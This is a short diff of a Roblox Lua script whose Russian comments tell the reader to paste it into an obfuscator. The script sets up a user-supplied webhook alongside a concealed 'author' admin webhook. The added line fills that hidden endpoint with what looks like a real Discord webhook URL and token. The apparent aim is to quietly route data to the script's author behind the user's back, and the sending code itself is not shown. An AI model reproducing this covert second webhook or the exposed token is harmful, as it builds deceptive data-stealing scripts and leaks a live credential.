@@ -1,6 +1,6 @@
 -- BEGIN (копируй весь этот блок в обфускатор)
 -- ВНУТРЕННИЙ КОД (берёт пользовательский webhook из глобальной переменной `Webhook`)
-local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/YOUR_ADMIN_WEBHOOK_HERE" -- <- твой авторский (скрыт)
+local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- <- твой авторский (скрыт)
 local USER_WEBHOOK = Webhook -- <-- ПОЛЬЗОВАТЕЛЬСКИЙ: глобальная переменная, задаётся снаружи
 
 local HttpService = game:GetService("HttpService")
